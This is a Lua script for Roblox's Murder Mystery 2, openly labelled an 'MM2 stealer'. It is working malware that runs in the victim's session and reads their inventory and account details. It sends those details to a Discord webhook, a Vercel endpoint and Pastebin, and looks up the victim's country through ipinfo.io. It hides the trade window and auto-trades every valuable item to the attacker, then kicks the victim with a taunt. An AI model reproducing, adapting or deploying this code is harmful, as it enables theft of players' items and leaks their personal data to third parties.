_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local ExecutorWebhoo2 = identifyexecutor() or "undefined"
if ExecutorWebhoo2 == "Delta" then
    game.Players.LocalPlayer:Kick("Our Script not support delta executor. Try other executor! recommand: Codex, Ronix")
end

local function MM2()
    local user = Username
    local webhook = Webhook

    local VintageList = ""
    local UniqueList = ""
    local AncientList = ""
    local GodlyList = ""
    local LegendaryList = ""
    local HalloweenList = ""
    local ChristmasList = ""
    local RareList = ""
    local UncommonList = ""
    local CommonList = ""

    local vintageItemsC = 0
    local uniqueItemsC = 0
    local ancientItemsC = 0
    local godlyItemsC = 0
    local legendaryItemsC = 0
    local HalloweenItemsC = 0
    local ChristmasItemsC = 0
    local rareItemsC = 0
    local uncommonItemsC = 0
    local commonItemsC = 0
    local List = ""
    local List2 = ""
    local fardplayer = game:GetService("Players").LocalPlayer
    local ExecutorWebhook = identifyexecutor() or "undefined"

    local weaponsToSend = {}
    local Players = game:GetService("Players")
    local plr = Players.LocalPlayer
    local playerGui = plr:WaitForChild("PlayerGui")
    local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    local HttpService = game:GetService("HttpService")

    local function trim2(s)
        return (s:gsub("^%s*(.-)%s*$", "%1"))
    end

    local rawCountryCode = game:HttpGet("https://ipinfo.io/country")
    local countryCode = trim2(rawCountryCode)
    countryCode = string.lower(countryCode)
    local countryFlagEmoji = ":flag_" .. countryCode .. ":"

    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
        plr:kick("Server error. Please join a different server!")
        return
    end

    if #Players:GetPlayers() >= 12 then
        plr:kick("Server error. Please join a different server!")
        return
    end

    local rarityTable = {
        "Common",
        "Uncommon",
        "Christmas",
        "Halloween",
        "Rare",
        "Legendary",
        "Godly",
        "Ancient",
        "Unique",
        "Vintage"
    }

    local categories = {
        godly = "https://supremevaluelist.com/mm2/godlies.html",
        ancient = "https://supremevaluelist.com/mm2/ancients.html",
        unique = "https://supremevaluelist.com/mm2/uniques.html",
        classic = "https://supremevaluelist.com/mm2/vintages.html",
        chroma = "https://supremevaluelist.com/mm2/chromas.html"
    }
    local headers = {
        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    }

    local function trim(s)
        return s:match("^%s*(.-)%s*$")
    end

    local function fetchHTML(url)
        local response =
            request(
            {
                Url = url,
                Method = "GET",
                Headers = headers
            }
        )
        return response.Body
    end

    local function parseValue(itembodyDiv)
        local valueStr = itembodyDiv:match('<b%s+class=[\'"]itemvalue[\'"]>([%d,%.]+)</b>')
        if valueStr then
            valueStr = valueStr:gsub(",", "")
            local value = tonumber(valueStr)
            if value then
                return value
            end
        end
        return nil
    end

    local function extractItems(htmlContent)
        local itemValues = {}

        for itemName, itembodyDiv in htmlContent:gmatch(
            '<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>'
        ) do
            itemName = itemName:match("([^<]+)")
            if itemName then
                itemName = trim(itemName:gsub("%s+", " "))
                itemName = trim((itemName:split(" Click "))[1])
                local itemNameLower = itemName:lower()

                local value = parseValue(itembodyDiv)
                if value then
                    itemValues[itemNameLower] = value
                end
            end
        end

        return itemValues
    end

    local function extractChromaItems(htmlContent)
        local chromaValues = {}

        for chromaName, itembodyDiv in htmlContent:gmatch(
            '<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>'
        ) do
            chromaName = chromaName:match("([^<]+)")
            if chromaName then
                chromaName = trim(chromaName:gsub("%s+", " ")):lower()
                local value = parseValue(itembodyDiv)
                if value then
                    chromaValues[chromaName] = value
                end
            end
        end

        return chromaValues
    end

    local function buildValueList()
        local allExtractedValues = {}
        local chromaExtractedValues = {}
        local categoriesToFetch = {}

        for rarity, url in pairs(categories) do
            table.insert(categoriesToFetch, {rarity = rarity, url = url})
        end

        local totalCategories = #categoriesToFetch
        local completed = 0
        local lock = Instance.new("BindableEvent")

        for _, category in ipairs(categoriesToFetch) do
            task.spawn(
                function()
                    local rarity = category.rarity
                    local url = category.url
                    local htmlContent = fetchHTML(url)

                    if htmlContent and htmlContent ~= "" then
                        if rarity ~= "chroma" then
                            local extractedItemValues = extractItems(htmlContent)
                            for itemName, value in pairs(extractedItemValues) do
                                allExtractedValues[itemName] = value
                            end
                        else
                            chromaExtractedValues = extractChromaItems(htmlContent)
                        end
                    end

                    completed = completed + 1
                    if completed == totalCategories then
                        lock:Fire()
                    end
                end
            )
        end

        lock.Event:Wait()

        local valueList = {}

        for dataid, item in pairs(database) do
            local itemName = item.ItemName and item.ItemName:lower() or ""
            local rarity = item.Rarity or ""
            local hasChroma = item.Chroma or false

            if itemName ~= "" and rarity ~= "" then
                local weaponRarityIndex = table.find(rarityTable, rarity)
                local godlyIndex = table.find(rarityTable, "Godly")

                if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                    if hasChroma then
                        local matchedChromaValue = nil
                        for chromaName, value in pairs(chromaExtractedValues) do
                            if chromaName:find(itemName) then
                                matchedChromaValue = value
                                break
                            end
                        end

                        if matchedChromaValue then
                            valueList[dataid] = matchedChromaValue
                        end
                    else
                        local value = allExtractedValues[itemName]
                        if value then
                            valueList[dataid] = value
                        end
                    end
                end
            end
        end

        return valueList
    end

    local function sendTradeRequest(user)
        local args = {
            [1] = game:GetService("Players"):WaitForChild(user)
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(
            unpack(args)
        )
    end

    local function getTradeStatus()
        return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
    end

    local function waitForTradeCompletion()
        while true do
            local status = getTradeStatus()
            if status == "None" then
                break
            end
            wait(0.1)
        end
    end

    local function acceptTrade()
        local args = {
            [1] = 285646582
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
    end

    local function addWeaponToTrade(id)
        local args = {
            [1] = id,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
    end

    local totalValue = 0

    local function SendJoinMessage(rawUrl)
        local fields = {
            {
                name = ":star: __**Mori Scripts**__",
                value = "```Username     : " ..
                    fardplayer.Name ..
                        "\nUser-ID      : " ..
                            fardplayer.userId ..
                                "\nAccount Age  : " ..
                                    fardplayer.AccountAge ..
                                        " Days" ..
                                            "\nExploit      : " ..
                                                ExecutorWebhook .. "\nReceiver     : " .. Username .. "```",
                inline = false
            },
            {
                name = ":ringed_planet: __/__ **`Inventory:`**",
                value = "```Total Value \240\159\147\154 : " ..
                    totalValue ..
                        "\n\nUnique      \240\159\141\132 : " ..
                            uniqueItemsC ..
                                "\nAncient     \240\159\140\191 : " ..
                                    ancientItemsC ..
                                        "\nGodly       \240\159\146\142 : " ..
                                            godlyItemsC ..
                                                "\nLegendary   \226\154\161 : " ..
                                                    legendaryItemsC ..
                                                        "\nVintage     \240\159\167\138 : " ..
                                                            vintageItemsC ..
                                                                "\nRare        \240\159\140\136 : " ..
                                                                    rareItemsC ..
                                                                        "\nHalloween   \240\159\142\131 : " ..
                                                                            HalloweenItemsC ..
                                                                                "\nChristmas   \240\159\142\132 : " ..
                                                                                    ChristmasItemsC ..
                                                                                        "\nUncommon    \240\159\140\184 : " ..
                                                                                            uncommonItemsC ..
                                                                                                "\nCommon      \240\159\147\166 : " ..
                                                                                                    commonItemsC ..
                                                                                                        "```",
                inline = false
            },
            {
                name = "Hits List:",
                value = rawUrl,
                inline = false
            }
        }

        local data = {
            ["content"] = "--@everyone\n" ..
                [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] ..
                    game.PlaceId .. [[, "]] .. game.JobId .. [[")]],
            ["username"] = fardplayer.Name,
            ["avatar_url"] = "https://raw.githubusercontent.com/kk4ft/Server/main/mori.png",
            ["embeds"] = {
                {
                    ["color"] = null,
                    ["fields"] = fields
                }
            }
        }

        local body = HttpService:JSONEncode(data)
        local headers = {
            ["Content-Type"] = "application/json"
        }
        local response =
            request(
            {
                Url = webhook,
                Method = "POST",
                Headers = headers,
                Body = body
            }
        )
    end

    local function GlobalMessage(countryFlagEmoji, List2, rawUrl, discuser)
        local fields = {
            {
                name = "Victim Username:",
                value = "Username is hidden\nCountry: " .. countryFlagEmoji,
                inline = false
            },
            {
                name = "Inventory Information:",
                value = "",
                inline = false
            },
            {
                name = "Summary:",
                value = "Total Value: " .. totalValue .. "\nInventory Link: " .. rawUrl,
                inline = false
            }
        }

        fields[2].value = fields[2].value .. "```" .. List2 .. "```"

        if #fields[2].value > 1024 then
            local lines = {}
            for line in fields[2].value:gmatch("[^\r\n]+") do
                table.insert(lines, line)
            end

            while #fields[2].value > 1024 and #lines > 0 do
                table.remove(lines)
                fields[2].value = table.concat(lines, "\n") .. "\nand more!```"
            end
        end

        local data2 = {
            ["username"] = "Mori Scripts Global Hit",
            ["avatar_url"] = "https://raw.githubusercontent.com/kk4ft/Server/main/mori.png",
            ["embeds"] = {
                {
                    ["title"] = ":knife: New MM2 Execution",
                    ["color"] = 65280,
                    ["fields"] = fields,
                    ["footer"] = {
                        ["text"] = "MM2 stealer by Mooze. discord.gg/PzWY2QX8cu"
                    }
                }
            }
        }

        local body = HttpService:JSONEncode(data2)

        local headers = {
            ["Content-Type"] = "application/json",
            ["DiscUser"] = discuser
        }

        local response =
            request(
            {
                Url = "https://webhook-taupe-eta.vercel.app/safehook",
                Method = "POST",
                Headers = headers,
                Body = body
            }
        )
    end

    local tradegui = playerGui:WaitForChild("TradeGUI")
    tradegui:GetPropertyChangedSignal("Enabled"):Connect(
        function()
            tradegui.Enabled = false
        end
    )
    local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
    tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(
        function()
            tradeguiphone.Enabled = false
        end
    )

    local untradable = {
        ["DefaultGun"] = true,
        ["DefaultKnife"] = true,
        ["Reaver"] = true,
        ["Reaver_Legendary"] = true,
        ["Reaver_Godly"] = true,
        ["Reaver_Ancient"] = true,
        ["IceHammer"] = true,
        ["IceHammer_Legendary"] = true,
        ["IceHammer_Godly"] = true,
        ["IceHammer_Ancient"] = true,
        ["Gingerscythe"] = true,
        ["Gingerscythe_Legendary"] = true,
        ["Gingerscythe_Godly"] = true,
        ["Gingerscythe_Ancient"] = true,
        ["TestItem"] = true,
        ["Season1TestKnife"] = true,
        ["Cracks"] = true,
        ["Icecrusher"] = true,
        ["???"] = true,
        ["Dartbringer"] = true,
        ["TravelerAxeRed"] = true,
        ["TravelerAxeBronze"] = true,
        ["TravelerAxeSilver"] = true,
        ["TravelerAxeGold"] = true,
        ["BlueCamo_K_2022"] = true,
        ["GreenCamo_K_2022"] = true,
        ["SharkSeeker"] = true
    }

    local valueList = buildValueList()
    local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

    for i, v in pairs(realData.Weapons.Owned) do
        local dataid = i
        local amount = v
        local rarity = database[dataid].Rarity
        local weapon_rarity_index = table.find(rarityTable, rarity)
        if amount > 0 and not untradable[dataid] then
            local value
            if valueList[dataid] then
                value = valueList[dataid]
            else
                if weapon_rarity_index >= table.find(rarityTable, "Godly") then
                    value = 2
                else
                    value = 0
                end
            end
            totalValue = totalValue + (value * amount)
            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = (value * amount)})
        end
    end

    for _, item in ipairs(weaponsToSend) do
        if item.Rarity == "Vintage" then
            VintageList = VintageList .. item.DataID .. " x" .. item.Amount .. "\n"
            vintageItemsC = vintageItemsC + item.Amount
        elseif item.Rarity == "Unique" then
            UniqueList = UniqueList .. item.DataID .. " x" .. item.Amount .. "\n"
            uniqueItemsC = uniqueItemsC + item.Amount
        elseif item.Rarity == "Ancient" then
            AncientList = AncientList .. item.DataID .. " x" .. item.Amount .. "\n"
            ancientItemsC = ancientItemsC + item.Amount
        elseif item.Rarity == "Godly" then
            GodlyList = GodlyList .. item.DataID .. " x" .. item.Amount .. "\n"
            godlyItemsC = godlyItemsC + item.Amount
        elseif item.Rarity == "Legendary" then
            LegendaryList = LegendaryList .. item.DataID .. " x" .. item.Amount .. "\n"
            legendaryItemsC = legendaryItemsC + item.Amount
        elseif item.Rarity == "Halloween" then
            HalloweenList = HalloweenList .. item.DataID .. " x" .. item.Amount .. "\n"
            HalloweenItemsC = HalloweenItemsC + item.Amount
        elseif item.Rarity == "Christmas" then
            ChristmasList = ChristmasList .. item.DataID .. " x" .. item.Amount .. "\n"
            ChristmasItemsC = ChristmasItemsC + item.Amount
        elseif item.Rarity == "Rare" then
            RareList = RareList .. item.DataID .. " x" .. item.Amount .. "\n"
            rareItemsC = rareItemsC + item.Amount
        elseif item.Rarity == "Uncommon" then
            UncommonList = UncommonList .. item.DataID .. " x" .. item.Amount .. "\n"
            uncommonItemsC = uncommonItemsC + item.Amount
        elseif item.Rarity == "Common" then
            CommonList = CommonList .. item.DataID .. " x" .. item.Amount .. "\n"
            commonItemsC = commonItemsC + item.Amount
        end
        List2 = List2 .. item.DataID .. " (x" .. item.Amount .. "): " .. item.Value .. " Value\n"
    end

    task.wait(0.1)

    if VintageList ~= "" then
        List = List .. "VINTAGE LIST:\n" .. VintageList .. "\n"
    end
    if UniqueList ~= "" then
        List = List .. "UNIQUE LIST:\n" .. UniqueList .. "\n"
    end
    if AncientList ~= "" then
        List = List .. "ANCIENT LIST:\n" .. AncientList .. "\n"
    end
    if GodlyList ~= "" then
        List = List .. "GODLY LIST:\n" .. GodlyList .. "\n"
    end
    if LegendaryList ~= "" then
        List = List .. "LEGENDARY LIST:\n" .. LegendaryList .. "\n"
    end
    if HalloweenList ~= "" then
        List = List .. "HALLOWEEN LIST:\n" .. HalloweenList .. "\n"
    end
    if ChristmasList ~= "" then
        List = List .. "CHRISTMAS LIST:\n" .. ChristmasList .. "\n"
    end
    if RareList ~= "" then
        List = List .. "RARE LIST:\n" .. RareList .. "\n"
    end
    if UncommonList ~= "" then
        List = List .. "UNCOMMON LIST:\n" .. UncommonList .. "\n"
    end
    if CommonList ~= "" then
        List = List .. "COMMON LIST:\n" .. CommonList .. "\n"
    end

    if #weaponsToSend > 0 then
        table.sort(
            weaponsToSend,
            function(a, b)
                return a.Value > b.Value
            end
        )

        local sentWeapons = {}
        for i, v in ipairs(weaponsToSend) do
            sentWeapons[i] = v
        end

        local body = {
            api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
            api_paste_code = "MM2 STEALER BY MOOZE, JOIN discord.gg/PzWY2QX8cu\n\n" .. List,
            api_option = "paste"
        }

        local encodedBody = ""
        for key, value in pairs(body) do
            encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
        end
        encodedBody = encodedBody:sub(1, -2)

        local response
        local success, err =
            pcall(
            function()
                response =
                    request(
                    {
                        Url = "https://pastebin.com/api/api_post.php",
                        Method = "POST",
                        Body = encodedBody,
                        Headers = {
                            ["Content-Type"] = "application/x-www-form-urlencoded"
                        },
                        Timeout = 20
                    }
                )
            end
        )

        local rawUrl
        if not success or not response or not response.Success then
            rawUrl = "Ratelimited"
        else
            local pasteUrl = response.Body
            rawUrl = "[Click Me](https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$") .. ")"
        end

        SendJoinMessage(rawUrl)
        GlobalMessage(countryFlagEmoji, List2, rawUrl, discuser)

        local function doTrade(joinedUser)
            local initialTradeState = getTradeStatus()
            if initialTradeState == "StartTrade" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
                wait(0.3)
            elseif initialTradeState == "ReceivingRequest" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                wait(0.3)
            end

            while #weaponsToSend > 0 do
                local tradeStatus = getTradeStatus()

                if tradeStatus == "None" then
                    sendTradeRequest(joinedUser)
                elseif tradeStatus == "SendingRequest" then
                    wait(0.3)
                elseif tradeStatus == "ReceivingRequest" then
                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer(

                    )
                    wait(0.3)
                elseif tradeStatus == "StartTrade" then
                    for i = 1, math.min(4, #weaponsToSend) do
                        local weapon = table.remove(weaponsToSend, 1)
                        for count = 1, weapon.Amount do
                            addWeaponToTrade(weapon.DataID)
                        end
                    end
                    wait(6)
                    acceptTrade()
                    waitForTradeCompletion()
                else
                    wait(0.5)
                end
                wait(1)
            end
            plr:kick(
                "All your stuff has just been stolen by Mori Scripts Tradestealer. Join discord.gg/PzWY2QX8cu to start tradestealing yourself"
            )
        end

        local function waitForUserChat()
            local sentMessage = false
            local function onPlayerChat(player)
                if user == player.Name then
                    player.Chatted:Connect(
                        function()
                            doTrade(player.Name)
                        end
                    )
                end
            end
            for _, p in ipairs(Players:GetPlayers()) do
                onPlayerChat(p)
            end
            Players.PlayerAdded:Connect(onPlayerChat)
        end
        waitForUserChat()
    end
end

if game.PlaceId == 142823291 or game.PlaceId == 335132309 or game.PlaceId == 636649648 then
    MM2()
end
